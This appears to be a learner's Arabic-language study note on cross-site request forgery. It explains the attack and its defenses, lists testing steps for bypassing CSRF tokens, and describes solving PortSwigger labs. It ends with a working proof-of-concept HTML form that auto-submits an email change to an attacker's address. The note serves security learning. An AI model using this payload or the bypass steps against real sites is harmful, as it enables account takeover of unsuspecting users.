#### «إنَّ الحمدَ للهِ ، نحمدُه ونستعينُه ونستهديه ونستغفِرُه ، ونعوذُ باللهِ من شرورِ أنفسنِا ومن سيِّئاتِ أعمالِنا ، من يهدِه اللهُ فلا مُضلَّ له ، ومن يُضلِلْ فلا هاديَ له ، وأشهدُ أن لا إلهَ إلَّا اللهُ وحدَه لا شريكَ له ، وأشهدُ أنَّ محمَّدًا عبدُه ورسولُه»
----

### أي هي ال csrf ؟

ال CSRF (تزوير الطلبات بين المواقع) هي طريقة الهاكر بيستخدمها عشان يخليك - من غير ما تاخد بالك - تنفذ حاجة على موقع إنت أصلاً مسجل دخول عليه.
### مثال بسيط:

- إنت فاتح حسابك على بنك أونلاين، ومُسجل دخول.
- في نفس الوقت دخلت على موقع مشبوه (مثلاً دوست علي لينك في رسالة أو إعلان).
- الموقع المشبوه ده بيبعت طلب للموقع بتاع البنك نيابة عنك، زي مثلاً يحوّل فلوس أو يغير الباسوورد.
- لأن المتصفح بتاعك فيه "ال cookies" اللي بتأكد إنك مسجل دخول، البنك هيصدق إن الطلب ده منك، مع إنه من الهاكر.
### طيب إزاي نحمي نفسنا؟

1. المواقع بتضيف أكواد حماية زي **CSRF Token**، وده زي مفتاح سري بيتأكد إن الطلب جاي من مكان موثوق.
2. متفتحش روابط غريبة وأنت مسجل دخول على مواقع حساسة زي البنك أو أي حساب مهم.
3. استخدم متصفح حديث لأنه بيكون فيه إجراءات حماية متطورة.

>يعني الموضوع ببساطة: الهاكر بيحاول يستغل جلستك المفتوحة على موقع موثوق عشان يعمل طلبات من غير إذنك.

### خطوات البحث علي ال CSRF ؟

- لو الrequest مفهوش csrf token يبقي بنسبة كبيرة مفيش حماية ويبقي الموقع معرض للثغرة
- جرب تغير قيمة الcsrf أو تشيلها خالص وطبعا تبعت ال request في كل مرة
- جرب تغير ال request method من POST ل GET والعكس صحيح طبعا
- أعمل أكونت جديد وجرب بالcsrf token بتاعته انك تغير أي information في الأكونت القديم
- حاول تعمل chain بين الثغرة دي واي ثغرة تانية زي XSS أو CRLF

### أزاي حليت لابات بورت سويجر ؟

- الحل مخرجش من قسم خطوات البحث علي ال CSRF
- + أني أخدت الفورم بتاعت ال change email وعملت عليها زي فلترة عشان اقدر احطها في السيرفر وأحاكي الreal target فحولتها من
```HTML
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
	<label>Email</label>
	<input required type="email" name="email" value="">
	<button class='button' type='submit'> Update email </button>
</form>
```
الي كدة
```HTML
<form name="change-email-form" action="[YOUR LAP LINK]/my-account/change-email" method="POST">
	<input required type="email" name="email" value="hacker@gmail.com">
</form>
<script>
	document.forms[0].submit();
</script>
```
وكنت بغير بقي حاجات زي ال method حسب اللاب وهكذا

---
